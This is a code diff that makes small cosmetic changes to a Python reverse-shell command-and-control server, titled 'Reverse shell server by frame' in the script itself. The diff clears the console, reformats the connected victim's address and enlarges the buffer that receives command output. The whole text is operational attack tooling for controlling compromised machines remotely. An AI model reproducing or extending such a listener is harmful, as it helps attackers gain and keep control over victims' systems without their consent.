@@ -1,6 +1,6 @@
 import socket 
 import pystyle 
-from pystyle import Colorate, Colors
+from pystyle import Colorate, Colors , Write
 import os
 import random
 import time
@@ -9,7 +9,7 @@ import ctypes
 times = 5000
 
 def main():
-    #os.system('cls') if you want to clean your console just retire the # and this text
+    os.system('cls')
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     ctypes.windll.kernel32.SetConsoleTitleW(" Reverse shell server by frame ")
     print(Colors.green,f"""
@@ -29,7 +29,7 @@ def main():
     conn, addr = s.accept() 
     time.sleep(0.1)
     #client_ip = conn.recv(1024).decode()
-    print (f' {Colors.white}[{Colors.green}+{Colors.white}] Connection From: {Colors.green}', addr)
+    print (f' {Colors.white}[{Colors.green}+{Colors.white}] Connection From: {Colors.green}{addr[0]}:{addr[1]}')
     time.sleep(0.1)
     print(f' {Colors.white}[{Colors.green}+{Colors.white}] Starting session ...')
     time.sleep(2)
@@ -73,7 +73,7 @@ def main():
             print("")
             print(f" {Colors.white}[{Colors.green}+{Colors.white}] OS LOG:")
             print("------------------------------------------------------------------------")
-            results = conn.recv(1024).decode()
+            results = conn.recv(4096).decode()
             print(results)
             print("------------------------------------------------------------------------")
 
